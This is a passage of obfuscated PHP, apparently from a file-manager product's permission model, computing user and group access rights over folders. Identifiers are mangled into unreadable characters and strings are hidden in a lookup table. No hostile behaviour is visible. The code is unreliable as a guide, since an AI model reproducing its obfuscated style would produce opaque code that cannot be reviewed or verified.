($ƒòëŠÂ[$ı¿…Á†ê[1837]] && $ƒòëŠÂ[$ı¿…Á†ê[1837]] == $€”êÃÚå) { continue; } $¾İğû»Ã[] = array($ı¿…Á†ê[204] => $ÀÌøì•ö[$ı¿…Á†ê[204]], $ı¿…Á†ê[201] => $€‹¿€æš, $ı¿…Á†ê[590] => intval($ÂÕ¼¤Ò), $ı¿…Á†ê[2145] => isset($»ßÄë€Ò[$ı¿…Á†ê[492]]) ? intval($»ßÄë€Ò[$ı¿…Á†ê[492]]) : 0, $ı¿…Á†ê[2208] => isset($»ßÄë€Ò[$ı¿…Á†ê[2208]]) ? intval($»ßÄë€Ò[$ı¿…Á†ê[2208]]) : -1); } $¾İğû»Ã[] = array($ı¿…Á†ê[204] => $ÀÌøì•ö[$ı¿…Á†ê[204]], $ı¿…Á†ê[201] => SourceModel::TYPE_USER, $ı¿…Á†ê[590] => intval($€”êÃÚå), $ı¿…Á†ê[2145] => intval($´ïæ£œ˜), $ı¿…Á†ê[2208] => -1); $this->where(array($ı¿…Á†ê[511] => $ÀÌøì•ö[$ı¿…Á†ê[204]]))->delete(); $this->addAll($¾İğû»Ã); } return !0; } public function get($£š…áëë) { $ÈããÆÄ = $this->getSourceList(array($£š…áëë), !0); return $ÈããÆÄ[0]; } public function getSourceList($Øá©, $¬ŒœèÃ³ = false, $óïÃÀº³ = false) { $Êõôİ¤‰ =& $_SERVER[¬ÏÕ§Áú]; if (!$Øá©) { return array(); } $Æ‰´û† = Model($Êõôİ¤‰[1483]); if (!$¬ŒœèÃ³ && count($Øá©) == 1) { $¬ŒœèÃ³ = array(); $¬ŒœèÃ³[$Øá©[0]] = $Æ‰´û†->sourceInfo($Øá©[0]); } if (!$¬ŒœèÃ³) { $ñ¦ó±å = array($Êõôİ¤‰[511] => array($Êõôİ¤‰[512], $Øá©)); $¬ŒœèÃ³ = $Æ‰´û†->field($Êõôİ¤‰[2249])->where($ñ¦ó±å)->select(); $¬ŒœèÃ³ = array_to_keyvalue($¬ŒœèÃ³, $Êõôİ¤‰[204]); } $‹ïæƒÏ‹ = $Øá©; foreach ($¬ŒœèÃ³ as $£¸úí¹€ => $°¨ØéÊ‰) { $ïÛâŒÈü = $Æ‰´û†->parentLevelArray($°¨ØéÊ‰[$Êõôİ¤‰[605]]); $‹ïæƒÏ‹ = array_merge($‹ïæƒÏ‹, array(intval($£¸úí¹€)), array_reverse($ïÛâŒÈü)); } $‹ïæƒÏ‹ = array_values(array_unique($‹ïæƒÏ‹)); if (!$‹ïæƒÏ‹) { return array(); } $”ÄĞîã© = $this->sourceAuthSelect($‹ïæƒÏ‹); $¥ÏãØÅ± = array(); foreach ($‹ïæƒÏ‹ as $è«ÈšÂ˜) { if (isset($”ÄĞîã©[$è«ÈšÂ˜])) { $¥ÏãØÅ±[$è«ÈšÂ˜] = $”ÄĞîã©[$è«ÈšÂ˜]; } } $öú­È¬É = $this->userIsRoot($óïÃÀº³); $ßÈÎ©‹ = AuthModel::authAll(); $«î˜Æµˆ = array($Êõôİ¤‰[508] => $ßÈÎ©‹, $Êõôİ¤‰[2250] => array($Êõôİ¤‰[513] => 0, $Êõôİ¤‰[2043] => $ßÈÎ©‹, $Êõôİ¤‰[514] => LNG($Êõôİ¤‰[2231]), $Êõôİ¤‰[2060] => $Êõôİ¤‰[2232])); $Ã¢Ç¥·¦ = array(); foreach ($¬ŒœèÃ³ as $è«ÈšÂ˜ => $ğ—¤¸) { if ($öú­È¬É && $GLOBALS[$Êõôİ¤‰[6]][$Êõôİ¤‰[2056]]) { $Ã¢Ç¥·¦[$è«ÈšÂ˜] = $«î˜Æµˆ; continue; } $Ã¢Ç¥·¦[$è«ÈšÂ˜] = $this->makeSourceAuth($ğ—¤¸, $¥ÏãØÅ±, $óïÃÀº³); } return $Ã¢Ç¥·¦; } public function authDeepCheck($‡ÖïÕ²Â, $×¯²íï = false) { $·Ğ”Â©å =& $_SERVER[¬ÏÕ§Áú]; $×¯²íï = $×¯²íï ? $×¯²íï : USER_ID; $Ñ÷„ˆë¹ = $this->makeAuthDeep($×¯²íï); if (!in_array($‡ÖïÕ²Â, $Ñ÷„ˆë¹[$·Ğ”Â©å[2251]])) { return !1; } $õıŒ à± = array(); foreach ($Ñ÷„ˆë¹[$·Ğ”Â©å[2252]] as $”à€¾¾à => $õ¯ÌËŸí) { if (!in_array($‡ÖïÕ²Â, $õ¯ÌËŸí)) { continue; } $õıŒ à±[] = $”à€¾¾à; } if (!$õıŒ à±) { return !1; } $Õ–É™“ò = $õıŒ à± ? $õıŒ à±[0] : $‡ÖïÕ²Â; return array($·Ğ”Â©å[508] => -1, $·Ğ”Â©å[561] => array($·Ğ”Â©å[513] => $·Ğ”Â©å[1328], $·Ğ”Â©å[2043] => $·Ğ”Â©å[241], $·Ğ”Â©å[514] => LNG($·Ğ”Â©å[2253]), $·Ğ”Â©å[2060] => $·Ğ”Â©å[2254]), $·Ğ”Â©å[2242] => LNG($·Ğ”Â©å[2255]), $·Ğ”Â©å[2256] => $this->sourceAuthInfo($Õ–É™“ò)); } protected function makeAuthDeep($ ¨œ‹ÖŒ = false) { $ìŞ©‡ê² =& $_SERVER[¬ÏÕ§Áú]; static $‹š”ôÏŠ = array(); $ ¨œ‹ÖŒ = $ ¨œ‹ÖŒ ? $ ¨œ‹ÖŒ : USER_ID; if (isset($‹š”ôÏŠ[$ ¨œ‹ÖŒ])) { return $‹š”ôÏŠ[$ ¨œ‹ÖŒ]; } $Œ·ğ¦Ïù = Model($ìŞ©‡ê²[2257])->listData(); $Æ´³Î° = array(); foreach ($Œ·ğ¦Ïù as $ê‘È›óÆ) { if ($ê‘È›óÆ[$ìŞ©‡ê²[507]] == 0 && $ê‘È›óÆ[$ìŞ©‡ê²[2059]] == $ìŞ©‡ê²[101]) { $Æ´³Î°[] = $ê‘È›óÆ[$ìŞ©‡ê²[492]]; } } $Æûşí‚˜ = $this->userGroupParents($ ¨œ‹ÖŒ); $àëèÜ» = array($ìŞ©‡ê²[201] => SourceModel::TYPE_USER, $ìŞ©‡ê²[590] => $ ¨œ‹ÖŒ); if ($Æûşí‚˜) { $àëèÜ» = array(array($ìŞ©‡ê²[201] => SourceModel::TYPE_USER, $ìŞ©‡ê²[590] => $ ¨œ‹ÖŒ), array($ìŞ©‡ê²[201] => SourceModel::TYPE_GROUP, $ìŞ©‡ê²[590] => array($ìŞ©‡ê²[512], $Æûşí‚˜)), $ìŞ©‡ê²[1125] => $ìŞ©‡ê²[2139]); } $Ô•°³­İ = $this->field($ìŞ©‡ê²[2258])->where($àëèÜ»)->select(); $»İõÖö‰ = array(); $Ø”‰áßç = array_to_keyvalue_group($Ô•°³­İ, $ìŞ©‡ê²[204]); foreach ($Ø”‰áßç as $÷ÕÈ£™ => $ëÀÁ†é´) { $È¼ˆï = $this->authArrayCheck($ëÀÁ†é´, $ ¨œ‹ÖŒ); if ($È¼ˆï[$ìŞ©‡ê²[508]] > 0) { $»İõÖö‰[] = $÷ÕÈ£™ . $ìŞ©‡ê²[12]; } } if ($Æûşí‚˜) { $¨™ÏŒäÙ = Model($ìŞ©‡ê²[606]); foreach ($Æûşí‚˜ as $üÌË‡² ) { $á¶Ú‹Ø” = $¨™ÏŒäÙ->getInfo($üÌË‡² ); if (!$á¶Ú‹Ø” || !is_array($á¶Ú‹Ø”[$ìŞ©‡ê²[100]])) { continue; } $»İõÖö‰[] = $á¶Ú‹Ø”[$ìŞ©‡ê²[100]][$ìŞ©‡ê²[204]]; } } $»Ğª‡Ç… = array(); $Ï¦äŒ´€ = $Æûşí‚˜; $°‹ÊÍñ = Model($ìŞ©‡ê²[1483]); $¨™ÏŒäÙ = Model($ìŞ©‡ê²[606]); $ÍÒß¹“í = array(); $ºİØãß¿ = array(); $İÓû€î€ = array(); $´¥°Ğ  = array(); if ($»İõÖö‰) { $Êˆ­Õ‚œ = $°‹ÊÍñ->where(array($ìŞ©‡ê²[204] => array($ìŞ©‡ê²[512], $»İõÖö‰)))->select(); foreach ($Êˆ­Õ‚œ as $ë²›Ùå ) { if ($ë²›Ùå [$ìŞ©‡ê²[525]] == $ìŞ©‡ê²[101]) { continue; } $ì¨ÁÍû‡ = $°‹ÊÍñ->parentLevelArray($ë²›Ùå [$ìŞ©‡ê²[605]]); $»Ğª‡Ç… = array_merge($»Ğª‡Ç…, $ì¨ÁÍû‡); $Ï¦äŒ´€[] = $ë²›Ùå [$ìŞ©‡ê²[590]]; $ÍÒß¹“í[$ë²›Ùå [$ìŞ©‡ê²[204]]] = $ì¨ÁÍû‡; $ºİØãß¿[$ë²›Ùå [$ìŞ©‡ê²[204]]] = $ë²›Ùå [$ìŞ©‡ê²[590]]; } } $Ï¦äŒ´€ = array_values(array_unique($Ï¦äŒ´€)); $Å¡¯˜¿ô = $Ï¦äŒ´€; foreach ($Å¡¯˜¿ô as $üÌË‡² ) { $á¶Ú‹Ø” = $¨™ÏŒäÙ->getInfo($üÌË‡² ); $ì¨ÁÍû‡ = $°‹ÊÍñ->parentLevelArray($á¶Ú‹Ø”[$ìŞ©‡ê²[605]]); $Ï¦äŒ´€ = array_merge($Ï¦äŒ´€, $ì¨ÁÍû‡); } $Ï¦äŒ´€ = array_values(array_unique($Ï¦äŒ´€)); foreach ($Ï¦äŒ´€ as $üÌË‡² ) { $á¶Ú‹Ø” = $¨™ÏŒäÙ->getInfo($üÌË‡² ); $»Ğª‡Ç…[] = $á¶Ú‹Ø”[$ìŞ©‡ê²[100]][$ìŞ©‡ê²[204]]; $İÓû€î€[$üÌË‡² ] = $á¶Ú‹Ø”[$ìŞ©‡ê²[100]][$ìŞ©‡ê²[204]]; $´¥°Ğ [$üÌË‡² ] = $°‹ÊÍñ->parentLevelArray($á¶Ú‹Ø”[$ìŞ©‡ê²[605]]); } foreach ($ÍÒß¹“í as $¡‹ìó©¨ => $˜ˆœÁÄ) { $Ôµ†¤ˆ = $ºİØãß¿[$¡‹ìó©¨]; if (!$Ôµ†¤ˆ || !$İÓû€î€[$Ôµ†¤ˆ]) { continue; } $»ŒÏí–À = array(); foreach ($´¥°Ğ [$Ôµ†¤ˆ] as $üÌË‡² ) { $»ŒÏí–À[] = $İÓû€î€[$üÌË‡² ]; } $ÍÒß¹“í[$¡‹ìó©¨] = array_merge($»ŒÏí–À, $˜ˆœÁÄ); } $»Ğª‡Ç… = array_values(array_unique($»Ğª‡Ç…)); $Œê«ŸÏ = array($ìŞ©‡ê²[2251] => $»Ğª‡Ç…, $ìŞ©‡ê²[2252] => $ÍÒß¹“í); $‹š”ôÏŠ[$ ¨œ‹ÖŒ] = $Œê«ŸÏ; return $Œê«ŸÏ; } private function makeSourceAuth($…İĞËÈ, $Àö­ïŠ¶, $²üÔˆÂ· = false) { $™¥ñ€¨‘ =& $_SERVER[¬ÏÕ§Áú]; $•»¬«İÄ = $™¥ñ€¨‘[101]; $¸öö„áŒ = $…İĞËÈ[$™¥ñ€¨‘[590]]; $í•ï Ê÷ = $…İĞËÈ[$™¥ñ€¨‘[201]] == SourceModel::TYPE_GROUP; $îÒÊáÄù = $í•ï Ê÷ ? $this->groupRootAuth($¸öö„áŒ, $²üÔˆÂ·) : !1; if ($îÒÊáÄù && Model($™¥ñ€¨‘[592])->authCheckAction($îÒÊáÄù[$™¥ñ€¨‘[507]], $™¥ñ€¨‘[2058])) { return $this->groupAuthInfo($îÒÊáÄù, $¸öö„áŒ); } $¶‰…ğæ½ = Model($™¥ñ€¨‘[1483])->parentLevelArray($…İĞËÈ[$™¥ñ€¨‘[605]]); $¶‰…ğæ½ = array_merge(array($…İĞËÈ[$™¥ñ€¨‘[204]]), array_reverse($¶‰…ğæ½)); $ô• ­Øş = !1; foreach ($¶‰…ğæ½ as $®ğÊÌæ„) { if (!isset($Àö­ïŠ¶[$®ğÊÌæ„])) { continue; } $ ÓŞÆ» = $this->authMake($Àö­ïŠ¶[$®ğÊÌæ„], $²üÔˆÂ·); if ($ ÓŞÆ»[$™¥ñ€¨‘[561]]) { $ô• ­Øş = $ ÓŞÆ»; break; } } if (!$í•ï Ê÷) { return $ô• ­Øş; } if (!$ô• ­Øş && $îÒÊáÄù) { $ô• ­Øş = $this->groupAuthInfo($îÒÊáÄù, $¸öö„áŒ); } if (!$ô• ­Øş) { $ÛÑèâÂô = Model($™¥ñ€¨‘[606])->getInfo($¸öö„áŒ); $Ğ¦™ÅâÍ = explode($™¥ñ€¨‘[50], trim($ÛÑèâÂô[$™¥ñ€¨‘[605]], $™¥ñ€¨‘[50])); $Ğ¦™ÅâÍ = array_reverse($Ğ¦™ÅâÍ); foreach ($Ğ¦™ÅâÍ as $‚€á˜­) { if ($‚€á˜­ == $™¥ñ€¨‘[241] || $‚€á˜­ == $•»¬«İÄ) { continue; } $í¬Ü’µĞ = $this->groupRootAuth($‚€á˜­, $²üÔˆÂ·); if (!$í¬Ü’µĞ) { continue; } $ô• ­Øş = $this->groupAuthInfo($í¬Ü’µĞ, $‚€á˜­); break; } } if (!$ô• ­Øş || $ô• ­Øş[$™¥ñ€¨‘[508]] <= 0) { $ÀĞñ¤„½ = $this->authDeepCheck($…İĞËÈ[$™¥ñ€¨‘[204]], $²üÔˆÂ·); if ($ÀĞñ¤„½) { $ô• ­Øş = $ÀĞñ¤„½; } } return $ô• ­Øş; } private function userIsRoot($¡²ÕÇØö = false) { $Ò‡Ò‡«‘ =& $_SERVER[¬ÏÕ§Áú]; if (!$¡²ÕÇØö && KodUser::isRoot()) { return !0; } $Ğñâßõï = Model($Ò‡Ò‡«‘[618])->getInfo($¡²ÕÇØö); $Øš×”†ó = Model($Ò‡Ò‡«‘[2235])->listData($Ğñâßõï[$Ò‡Ò‡«‘[2236]]); if ($Øš×”†ó && $Øš×”†ó[$Ò‡Ò‡«‘[596]][$Ò‡Ò‡«‘[2239]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‘‡üÓ–Á) { $“†äŞû¸ =& $_SERVER[¬ÏÕ§Áú]; $¤¿–—ö = Model($“†äŞû¸[1483]); $ÄÜš›€— = $¤¿–—ö->sourceInfo($‘‡üÓ–Á); if (!$ÄÜš›€—) { return !1; } $¤¿–—ö->groupPathDisplay($ÄÜš›€—); $Ô˜¿İ©Ÿ = array($ÄÜš›€—); $Ô˜¿İ©Ÿ = $¤¿–—ö->_listAppendPath($Ô˜¿İ©Ÿ, !1); $ÄÜš›€— = $Ô˜¿İ©Ÿ[0]; $‡›í”Ê = $ÄÜš›€—[$“†äŞû¸[603]]; if (isset($ÄÜš›€—[$“†äŞû¸[611]])) { $¯â¯ò—¤ = explode($“†äŞû¸[8], trim($ÄÜš›€—[$“†äŞû¸[603]], $“†äŞû¸[8])); array_shift($¯â¯ò—¤); $‡›í”Ê = $ÄÜš›€—[$“†äŞû¸[609]] . $“†äŞû¸[2259] . implode($“†äŞû¸[8], $¯â¯ò—¤); } return array($“†äŞû¸[32] => $ÄÜš›€—[$“†äŞû¸[32]], $“†äŞû¸[204] => $ÄÜš›€—[$“†äŞû¸[204]], $“†äŞû¸[97] => KodIO::make($ÄÜš›€—[$“†äŞû¸[204]]), $“†äŞû¸[603] => $‡›í”Ê); } private function groupAuthInfo($çûúö†ª, $¡Ü“°ä) { $Åë‡†¥– =& $_SERVER[¬ÏÕ§Áú]; $ù¯¦µ = Model($Åë‡†¥–[606])->getInfo($¡Ü“°ä); return array($Åë‡†¥–[2260] => intval($çûúö†ª[$Åë‡†¥–[507]]), $Åë‡†¥–[2250] => $çûúö†ª, $Åë‡†¥–[2261] => LNG($Åë‡†¥–[2262]), $Åë‡†¥–[2256] => array($Åë‡†¥–[514] => $ù¯¦µ[$Åë‡†¥–[32]], $Åë‡†¥–[97] => KodIO::make($ù¯¦µ[$Åë‡†¥–[100]][$Åë‡†¥–[204]]), $Åë‡†¥–[2263] => $ù¯¦µ[$Åë‡†¥–[610]])); } protected function groupRootAuth($µó¡ÄÂ, $üø‰êÎé = false) { $¥²Ñà‰ =& $_SERVER[¬ÏÕ§Áú]; $üø‰êÎé = $üø‰êÎé ? $üø‰êÎé : USER_ID; $«´şİ = $üø‰êÎé . $¥²Ñà‰[2264] . $µó¡ÄÂ; static $”²û¼ç = array(); if (isset($”²û¼ç[$«´şİ])) { return $”²û¼ç[$«´şİ]; } $‘¢Çêøñ = Model($¥²Ñà‰[606])->getInfo($µó¡ÄÂ); $Ç‰ÆÉ = $this->userGroupList($üø‰êÎé); $æ€Íôö = isset($Ç‰ÆÉ[$µó¡ÄÂ]) ? $Ç‰ÆÉ[$µó¡ÄÂ][$¥²Ñà‰[507]] : !1; if ($æ€Íôö && Model($¥²Ñà‰[592])->authCheckAction($æ€Íôö[$¥²Ñà‰[507]], $¥²Ñà‰[2058])) { $”²û¼ç[$«´şİ] = $æ€Íôö; return $æ€Íôö; } $ª™™Ô¬í = $this->sourceAuthSelect($‘¢Çêøñ[$¥²Ñà‰[100]][$¥²Ñà‰[204]]); $ï½ºÂÓÊ = $ª™™Ô¬í ? $this->authMake($ª™™Ô¬í, $üø‰êÎé) : !1; $õÛğ“ñ = $ï½ºÂÓÊ ? $ï½ºÂÓÊ[$¥²Ñà‰[561]] : !1; $”²û¼ç[$«´şİ] = $õÛğ“ñ ? $õÛğ“ñ : $æ€Íôö; return $”²û¼ç[$«´şİ]; } public function authOwnerApply($ÓŒ¸“ß¡) { $Í³²¢™¯ =& $_SERVER[¬ÏÕ§Áú]; if (empty($ÓŒ¸“ß¡[$Í³²¢™¯[507]]) || isset($ÓŒ¸“ß¡[$Í³²¢™¯[2265]]) && $ÓŒ¸“ß¡[$Í³²¢™¯[2265]]) { return $ÓŒ¸“ß¡; } if (AuthModel::authCheckRoot($ÓŒ¸“ß¡[$Í³²¢™¯[507]][$Í³²¢™¯[508]])) { return $ÓŒ¸“ß¡; } $ÍÔô·Ëß = Model($Í³²¢™¯[1483])->parentLevelArray($ÓŒ¸“ß¡[$Í³²¢™¯[605]]); $ÍÔô·Ëß = array_merge(array($ÓŒ¸“ß¡[$Í³²¢™¯[204]]), array_reverse($ÍÔô·Ëß)); $ƒƒû»»Ë = $this->sourceAuthSelect($ÍÔô·Ëß); $”í¥†·Î = array(); $³§Üâª = array(); foreach ($ƒƒû»»Ë as $²·ìè®Á => $ÂÚœÕª¼) { $Œ½üà´ = $this->authFolderOwnerUser($ÂÚœÕª¼); $”í¥†·Î[$²·ìè®Á] = $Œ½üà´; $³§Üâª = array_merge($³§Üâª, $Œ½üà´[$Í³²¢™¯[686]]); if ($Œ½üà´[$Í³²¢™¯[2266]]) { break; } } if (count($³§Üâª) == 0) { $³§Üâª = $this->authFolderOwnerGroup($ÓŒ¸“ß¡[$Í³²¢™¯[590]]); } $³§Üâª = array_unique($³§Üâª); if (AuthModel::authCheckRoot($ÓŒ¸“ß¡[$Í³²¢™¯[507]][$Í³²¢™¯[508]])) { $³§Üâª[] = USER_ID; } $ÓŒ¸“ß¡[$Í³²¢™¯[507]][$Í³²¢™¯[2267]] = Model($Í³²¢™¯[598])->userListInfo($³§Üâª); return $ÓŒ¸“ß¡; } private function authFolderOwnerGroup($öä“¢) { $óÍÉ®Üç =& $_SERVER[¬ÏÕ§Áú]; $û¹ÖÙ˜ = Model($óÍÉ®Üç[2131])->where(array($óÍÉ®Üç[1445] => $öä“¢))->select(); $¯ Ö = array(); if (!$û¹ÖÙ˜) { return $¯ Ö; } foreach ($û¹ÖÙ˜ as $Ñ„áï£Ÿ) { $¾±Š´ºÆ = $this->authInfo($Ñ„áï£Ÿ); if (AuthModel::authCheckRoot($¾±Š´ºÆ[$óÍÉ®Üç[507]])) { $¯ Ö[] = $Ñ„áï£Ÿ[$óÍÉ®Üç[1837]]; } } return $¯ Ö; } private function authFolderOwnerUser($ôÑš¬û) { $©í®Ñ‚„ =& $_SERVER[¬ÏÕ§Áú]; $ØÒŒ’Õ = array(); $ó×Ï­æî = !1; foreach ($ôÑš¬û as $Áı¤·¢Õ) { $ñüÌÏï = $this->authInfo($Áı¤·¢Õ); if ($Áı¤·¢Õ[$©í®Ñ‚„[590]] == $©í®Ñ‚„[241]) { $ó×Ï­æî = !0; } if ($Áı¤·¢Õ[$©í®Ñ‚„[201]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ñüÌÏï[$©í®Ñ‚„[507]])) { $ØÒŒ’Õ[] = $Áı¤·¢Õ[$©í®Ñ‚„[590]]; } } } return array($©í®Ñ‚„[686] => $ØÒŒ’Õ, $©í®Ñ‚„[2266] => $ó×Ï­æî); } public function authMake($ğõÀÇĞÆ, $şŒ¸×˜‘ = false) { $ï¨÷Ä½ä =& $_SERVER[¬ÏÕ§Áú]; $â¢Ìœçü = $this->authArrayCheck($ğõÀÇĞÆ, $şŒ¸×˜‘); if ($â¢Ìœçü[$ï¨÷Ä½ä[2246]]) { $â¢Ìœçü[$ï¨÷Ä½ä[2246]] = $this->sourceAuthInfo($â¢Ìœçü[$ï¨÷Ä½ä[2246]]); } return $â¢Ìœçü; } public function authArrayCheck($°øóºô, $İâ‚¹æ– = false) { $¶—­ã =& $_SERVER[¬ÏÕ§Áú]; if (!$°øóºô) { return array($¶—­ã[508] => 0, $¶—­ã[561] => !1, $¶—­ã[2261] => $¶—­ã[12]); } $İâ‚¹æ– = $İâ‚¹æ– ? $İâ‚¹æ– : USER_ID; $­‘ñ´óş = 0; $Ûßôù’ì = 0; $Îú¬Ûã = 0; $Ò‚Êáº = 0; $é†ÔÎÄ‚ = 0; $æ–áÂ¸Í = 0; $Üâòõ‡¯ = 0; $ºÂÎÑÁİ = 0; $Ã˜·§Ú½ = 1000; $Ş¯àÇÁ˜ = 0; $£‹–İ‚ˆ = 0; $Ÿ­ºÊú = 0; $éÚ²•ü« = 0; $²°ÛøÎš = 0; foreach ($°øóºô as $¾ÀÅŒ¨é) { $Ş›Œ‡©¹ = $this->authInfo($¾ÀÅŒ¨é); if (!$Ş›Œ‡©¹) { continue; } $ìÅ‰ƒ…¿ = $¾ÀÅŒ¨é[$¶—­ã[590]]; $ü¥Œ²– = $¾ÀÅŒ¨é[$¶—­ã[204]]; $Íùºµˆ = intval($Ş›Œ‡©¹[$¶—­ã[507]]); if ($¾ÀÅŒ¨é[$¶—­ã[201]] == SourceModel::TYPE_USER && $ìÅ‰ƒ…¿ == $İâ‚¹æ–) { $­‘ñ´óş = !0; $Îú¬Ûã = $Ş›Œ‡©¹; $Ûßôù’ì = $Íùºµˆ; $Ò‚Êáº = $ü¥Œ²–; } else { if ($¾ÀÅŒ¨é[$¶—­ã[201]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ìÅ‰ƒ…¿, $İâ‚¹æ–)) { $é†ÔÎÄ‚ = !0; $äÉø±‚© = $this->groupStepToUserGroup($ìÅ‰ƒ…¿, $İâ‚¹æ–); if ($äÉø±‚© < $Ã˜·§Ú½) { $Ã˜·§Ú½ = $äÉø±‚©; $æ–áÂ¸Í = $Íùºµˆ; $Üâòõ‡¯ = $Ş›Œ‡©¹; $Ş¯àÇÁ˜ = $ìÅ‰ƒ…¿; $ºÂÎÑÁİ = $ü¥Œ²–; } if ($äÉø±‚© == $Ã˜·§Ú½ && $Íùºµˆ >= $æ–áÂ¸Í) { $æ–áÂ¸Í = $Íùºµˆ; $Üâòõ‡¯ = $Ş›Œ‡©¹; $Ş¯àÇÁ˜ = $ìÅ‰ƒ…¿; $ºÂÎÑÁİ = $ü¥Œ²–; } } else { if (!$ìÅ‰ƒ…¿ || $ìÅ‰ƒ…¿ == $¶—­ã[241]) { $£‹–İ‚ˆ = !0; $éÚ²•ü« = $Ş›Œ‡©¹; $Ÿ­ºÊú = $Íùºµˆ; $²°ÛøÎš = $ü¥Œ²–; } } } } if ($­‘ñ´óş) { $Öé¾ßšô = $Ûßôù’ì; $Ş›Œ‡©¹ = $Îú¬Ûã; $ÑÁÁ‚« = $Ò‚Êáº; $³±Ôö³ = LNG($¶—­ã[2268]); } else { if ($é†ÔÎÄ‚) { $Öé¾ßšô = $æ–áÂ¸Í; $Ş›Œ‡©¹ = $Üâòõ‡¯; $ÑÁÁ‚« = $ºÂÎÑÁİ; $ÃŸ–óğ = Model($¶—­ã[606])->getInfo($Ş¯àÇÁ˜); $³±Ôö³ = $¶—­ã[186] . $ÃŸ–óğ[$¶—­ã[610]] . $¶—­ã[2269] . LNG($¶—­ã[2270]); } else { if ($£‹–İ‚ˆ) { $Öé¾ßšô = $Ÿ­ºÊú; $Ş›Œ‡©¹ = $éÚ²•ü«; $ÑÁÁ‚« = $²°ÛøÎš; $³±Ôö³ = LNG($¶—­ã[2248]); } else { $Öé¾ßšô = 0; $Ş›Œ‡©¹ = !1; $³±Ôö³ = $¶—­ã[12]; $ÑÁÁ‚« = $¶—­ã[12]; } } } $†²÷Ñ¡ = array($¶—­ã[2260] => intval($Öé¾ßšô), $¶—­ã[2250] => $Ş›Œ‡©¹, $¶—­ã[2261] => $³±Ôö³, $¶—­ã[2256] => $ÑÁÁ‚«); return $†²÷Ñ¡; } private function groupContainUser($Ã©´Š“, $€»¦Õ”É = false) { return in_array($Ã©´Š“, $this->userGroupParents($€»¦Õ”É)); } private function groupStepToUserGroup($±èÖ—ºî, $¢ÎûÆâ = false) { $¶èÓÄîÛ =& $_SERVER[¬ÏÕ§Áú]; $÷›Äé×Û = $this->userGroupList($¢ÎûÆâ); $“‰¾Ùâï = 1000; $ÀßşÊ·š = $GLOBALS[$¶èÓÄîÛ[6]][$¶èÓÄîÛ[102]][$¶èÓÄîÛ[2144]] == 1; $îıÜ•šÏ = $ÀßşÊ·š ? 3 : 2; foreach ($÷›Äé×Û as $—ôĞ±¥Ã) { if ($—ôĞ±¥Ã[$¶èÓÄîÛ[1445]] == $±èÖ—ºî) { return 0; } $ß†»„÷” = explode($¶èÓÄîÛ[50], trim($—ôĞ±¥Ã[$¶èÓÄîÛ[605]], $¶èÓÄîÛ[50])); if ($ß†»„÷”[0] == $¶èÓÄîÛ[241] && count($ß†»„÷”) > $îıÜ•šÏ) { $¯×ìè¤Æ = array_reverse(array_slice($ß†»„÷”, $îıÜ•šÏ)); $’’şâÙç = array_search($±èÖ—ºî, $¯×ìè¤Æ); if ($’’şâÙç !== !1 && $’’şâÙç + 1 <= $“‰¾Ùâï) { $“‰¾Ùâï = $’’şâÙç + 1; } } } return $“‰¾Ùâï; } private function userGroupList($¥ğÓıÜú = false, $„¾’ÎşÙ = false) { $ÉƒœáöÅ =& $_SERVER[¬ÏÕ§Áú]; static $“Æ€ë¨Ü = array(); if (isset($“Æ€ë¨Ü[$¥ğÓıÜú])) { return $“Æ€ë¨Ü[$¥ğÓıÜú]; } if (!$„¾’ÎşÙ) { $„¾’ÎşÙ = Model($ÉƒœáöÅ[618])->getInfo($¥ğÓıÜú); } $“Æ€ë¨Ü[$¥ğÓıÜú] = array_to_keyvalue($„¾’ÎşÙ[$ÉƒœáöÅ[1444]], $ÉƒœáöÅ[1445]); return $“Æ€ë¨Ü[$¥ğÓıÜú]; } public function userGroupParents($çêšÛÛ…) { $†Ç§Ôòˆ =& $_SERVER[¬ÏÕ§Áú]; static $¹Áş–Î = array(); $çêšÛÛ… = $çêšÛÛ… ? $çêšÛÛ… : USER_ID; if (isset($¹Áş–Î[$çêšÛÛ…])) { return $¹Áş–Î[$çêšÛÛ…]; } $óŒ¼Æ¥ = $this->userGroupList($çêšÛÛ…); $Æ¿ç„óŒ = array(); $¨™Í†Ø£ = $GLOBALS[$†Ç§Ôòˆ[6]][$†Ç§Ôòˆ[102]][$†Ç§Ôòˆ[2144]] == 1; $¢ë¸ŞÀ” = $¨™Í†Ø£ ? 3 : 2; foreach ($óŒ¼Æ¥ as $„š‘ç›) { $Øâ…éà = array($„š‘ç›[$†Ç§Ôòˆ[1445]]); $Â¿ˆ“— = explode($†Ç§Ôòˆ[50], trim($„š‘ç›[$†Ç§Ôòˆ[605]], $†Ç§Ôòˆ[50])); if ($Â¿ˆ“—[0] == $†Ç§Ôòˆ[241] && count($Â¿ˆ“—) > $¢ë¸ŞÀ”) { $©©üéŒú = array_slice($Â¿ˆ“—, $¢ë¸ŞÀ”); $Øâ…éà = array_merge($Øâ…éà, array_reverse($©©üéŒú)); } $Æ¿ç„óŒ = array_merge($Æ¿ç„óŒ, $Øâ…éà); } $¹Áş–Î[$çêšÛÛ…] = array_unique($Æ¿ç„óŒ); return $¹Áş–Î[$çêšÛÛ…]; } public function authTargetInfoMake($ûëÜá‹) { $¢°şøÎ =& $_SERVER[¬ÏÕ§Áú]; $Û·¨¤”Ï = array(); $†ƒ÷Ú”£ = array(); foreach ($ûëÜá‹ as $à·Ö™¸Ì) { if ($à·Ö™¸Ì[$¢°şøÎ[201]] == SourceModel::TYPE_USER) { $Û·¨¤”Ï[] = intval($à·Ö™¸Ì[$¢°şøÎ[590]]); } else { if ($à·Ö™¸Ì[$¢°şøÎ[201]] == SourceModel::TYPE_GROUP) { $†ƒ÷Ú”£[] = intval($à·Ö™¸Ì[$¢°şøÎ[590]]); } } } if ($Û·¨¤”Ï) { $Û·¨¤”Ï = Model($¢°şøÎ[598])->userListInfo($Û·¨¤”Ï); } if ($†ƒ÷Ú”£) { $ÆÊÃ¡âÒ = array($¢°şøÎ[2126] => array($¢°şøÎ[512], $†ƒ÷Ú”£)); $†ƒ÷Ú”£ = Model($¢°şøÎ[606])->field($¢°şøÎ[2271])->where($ÆÊÃ¡âÒ)->select(); $†ƒ÷Ú”£ = array_to_keyvalue($†ƒ÷Ú”£, $¢°şøÎ[1445]); } return array($¢°şøÎ[2272] => $Û·¨¤”Ï, $¢°şøÎ[2273] => $†ƒ÷Ú”£); } public function authInfo($á‡ô§®“) { $Ô ¶°¶– =& $_SERVER[¬ÏÕ§Áú]; if ($á‡ô§®“[$Ô ¶°¶–[2145]]) { 